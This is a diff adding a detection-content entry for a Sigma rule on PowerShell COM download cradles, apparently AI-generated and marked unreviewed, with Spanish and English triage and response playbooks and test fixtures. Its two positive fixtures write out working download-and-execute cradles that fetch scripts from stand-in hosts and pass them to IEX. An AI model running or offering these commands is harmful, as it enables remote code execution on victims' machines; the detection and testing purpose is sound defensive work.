@@ -1,0 +1,126 @@
+{
+  "rule": {
+    "id": "02b64f1b-3f33-4e67-aede-ef3b0a5a8fcf",
+    "title": "Potential COM Objects Download Cradles Usage - Process Creation",
+    "level": "medium",
+    "status": "test",
+    "author": "frack113",
+    "path": "windows/process_creation/proc_creation_win_powershell_download_com_cradles.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_powershell_download_com_cradles.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso ejecutó una línea de comandos que instancia por CLSID, mediante [Type]::GetTypeFromCLSID(, un objeto COM capaz de descargar contenido. Puede tratarse de un download cradle de PowerShell que intenta traer un payload remoto.",
+      "what_it_detects": "Eventos de creación de procesos cuyo CommandLine contiene '[Type]::GetTypeFromCLSID(' junto con alguno de los CLSID listados, que corresponden a objetos COM con capacidad de red o de automatización: Internet Explorer, MSXML2 XMLHTTP/ServerXMLHTTP, WinHttpRequest, Word y Excel.",
+      "why_it_matters": "Instanciar objetos COM por CLSID en lugar de usar su ProgID o Invoke-WebRequest evade firmas sencillas y permite descargar y ejecutar código en memoria. Corresponde a MITRE ATT&CK T1105 (Ingress Tool Transfer), la transferencia de herramientas al equipo comprometido.",
+      "triage_steps": [
+        "Revise el CommandLine completo: identifique el CLSID, la URL o dominio de destino y si el contenido descargado se pasa a IEX, Invoke-Expression o se guarda en disco.",
+        "Si el comando está ofuscado o codificado en Base64 (-enc), decodifíquelo antes de seguir y documente el script resultante.",
+        "Examine ParentImage y la cadena de procesos: Office, wscript, mshta, cmd o un servicio como padre de PowerShell es altamente sospechoso.",
+        "Valide el usuario y el host: ¿es una cuenta administrativa o de servicio esperada para tareas de automatización en ese equipo?",
+        "Busque en el mismo host, en una ventana de +/- 15 minutos, conexiones de red, consultas DNS, archivos creados y procesos hijos posteriores a la ejecución.",
+        "Consulte la reputación del dominio o IP destino y pivote para encontrar otros hosts que contactaron el mismo destino.",
+        "Revise alertas previas para el mismo host y usuario, y los logs de PowerShell Script Block (4104) si están disponibles."
+      ],
+      "false_positives": [
+        "Uso legítimo de la librería: scripts administrativos o de inventario que usan WinHttpRequest o XMLHTTP por CLSID para consultar APIs internas.",
+        "Automatización de Word o Excel por CLSID en procesos de generación de reportes o macros corporativas documentadas.",
+        "Herramientas de despliegue o monitoreo de terceros que encapsulan llamadas COM en PowerShell."
+      ],
+      "response_steps": [
+        "Verifique con el dueño del sistema o del script si la ejecución era esperada; si es legítima, documente y ajuste una exclusión acotada por ruta y usuario.",
+        "Si es maliciosa, aísle el endpoint desde el EDR y bloquee el dominio o IP de descarga en proxy y firewall.",
+        "Recupere y analice el payload descargado (hash, sandbox) y busque el mismo hash o URL en toda la flota.",
+        "Elimine artefactos y mecanismos de persistencia identificados, restablezca credenciales del usuario afectado y monitoree el host antes de reintegrarlo."
+      ],
+      "severity_rationale": "Medium es adecuado porque la técnica es una señal fuerte de descarga ofuscada, pero existen usos administrativos legítimos que requieren validación del contexto."
+    },
+    "en": {
+      "summary": "A process ran a command line that instantiates a download-capable COM object by CLSID via [Type]::GetTypeFromCLSID(. This may be a PowerShell download cradle fetching a remote payload.",
+      "what_it_detects": "Process creation events whose CommandLine contains '[Type]::GetTypeFromCLSID(' plus one of the listed CLSIDs, which map to network or automation COM objects: Internet Explorer, MSXML2 XMLHTTP/ServerXMLHTTP, WinHttpRequest, Word and Excel.",
+      "why_it_matters": "Creating COM objects by CLSID instead of ProgID or Invoke-WebRequest evades simple signatures and lets attackers download and run code in memory. This maps to MITRE ATT&CK T1105 (Ingress Tool Transfer).",
+      "triage_steps": [
+        "Read the full CommandLine: identify the CLSID, the target URL or domain, and whether the response is piped to IEX/Invoke-Expression or written to disk.",
+        "If the command is obfuscated or Base64-encoded (-enc), decode it first and record the resulting script.",
+        "Check ParentImage and the process tree: Office, wscript, mshta, cmd or a service spawning PowerShell is highly suspicious.",
+        "Validate the user and host: is this an admin or service account expected to run automation on this machine?",
+        "On the same host within +/- 15 minutes, look for network connections, DNS queries, file writes and child processes after execution.",
+        "Check reputation of the destination domain or IP and pivot to other hosts contacting it.",
+        "Review earlier alerts for the same host and user, and PowerShell Script Block logs (4104) if available."
+      ],
+      "false_positives": [
+        "Legitimate use of the library: admin or inventory scripts using WinHttpRequest or XMLHTTP by CLSID to query internal APIs.",
+        "Word or Excel automation by CLSID in documented reporting jobs or corporate macros.",
+        "Third-party deployment or monitoring tools that wrap COM calls in PowerShell."
+      ],
+      "response_steps": [
+        "Confirm with the system or script owner whether the run was expected; if legitimate, document it and add a narrow exclusion by path and user.",
+        "If malicious, isolate the endpoint via EDR and block the download domain or IP at proxy and firewall.",
+        "Retrieve and analyze the downloaded payload (hash, sandbox) and hunt for the same hash or URL fleet-wide.",
+        "Remove identified artifacts and persistence, reset the affected user's credentials, and monitor the host before returning it to service."
+      ],
+      "severity_rationale": "Medium fits because the technique strongly suggests obfuscated downloading, yet legitimate administrative uses exist and need context validation."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "PowerShell spawned by Word uses the Internet Explorer COM object by CLSID to fetch and execute a remote script.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": "powershell.exe -nop -w hidden -c \"$ie=[Activator]::CreateInstance([Type]::GetTypeFromCLSID('0002DF01-0000-0000-C000-000000000046'));$ie.visible=$false;$ie.navigate('http://198.51.100.23/a.ps1');sleep 5;IEX $ie.Document.body.innerText\""
+        }
+      },
+      {
+        "description": "PowerShell uses the WinHttpRequest COM object by CLSID to download content from an external host.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "powershell -c \"$h=[Activator]::CreateInstance([type]::GetTypeFromCLSID('2087c2f4-2cef-4953-a8ab-66779b670495'));$h.open('GET','http://files.example.org/stage.txt',$false);$h.send();iex $h.responseText\""
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "GetTypeFromCLSID used with the Shell.Application CLSID, which is not in the download-capable list, so selection_2 does not match.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "powershell.exe -c \"$s=[Activator]::CreateInstance([Type]::GetTypeFromCLSID('13709620-C279-11CE-A49E-444553540000'));$s.Windows().Count\""
+        }
+      },
+      {
+        "description": "Admin script creates MSXML2 XMLHTTP by ProgID with New-Object -ComObject; no GetTypeFromCLSID call or listed CLSID appears.",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-INV-01.andes.example.com",
+          "User": "ANDES\\svc_inventario",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "powershell.exe -File C:\\Scripts\\inventario.ps1 -Api https://inventario.example.com/api -ComObject Msxml2.XMLHTTP"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
